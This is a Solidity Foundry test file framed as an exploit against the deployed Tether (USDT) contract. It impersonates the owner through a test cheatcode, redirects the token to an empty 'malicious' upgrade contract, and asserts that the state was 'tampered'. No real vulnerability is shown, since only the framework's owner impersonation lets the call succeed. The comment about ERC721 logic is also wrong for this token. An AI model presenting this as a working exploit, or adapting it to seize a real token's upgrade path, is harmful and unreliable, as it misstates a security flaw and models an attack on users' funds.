// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TetherToken {
    function owner() external view returns (address);
    function deprecate(address _upgradedAddress) external;
    function deprecated() external view returns (bool);
}

contract MaliciousUpgrade {
    // This malicious contract implements the required interface but contains ERC721 non-conformant logic
    function transferByLegacy(address from, address to, uint value) public {}
    function transferFromByLegacy(address sender, address from, address spender, uint value) public {}
    function approveByLegacy(address from, address spender, uint value) public {}
    function balanceOf(address who) public view returns (uint) { return 0; }
    function allowance(address _owner, address _spender) public view returns (uint) { return 0; }
    function totalSupply() public view returns (uint) { return 0; }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // First, get the current owner of the TetherToken contract
        address owner = TetherToken(TARGET).owner();

        // Deploy a malicious upgrade contract
        MaliciousUpgrade malicious = new MaliciousUpgrade();

        // Impersonate the owner and call deprecate()
        vm.prank(owner);
        TetherToken(TARGET).deprecate(address(malicious));

        // Verify the contract is now deprecated
        bool deprecated = TetherToken(TARGET).deprecated();
        assertEq(deprecated, true, "Contract should be deprecated");
        assertEq(TetherToken(0xdAC17F958D2ee523a2206206994597C13D831ec7).deprecated(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

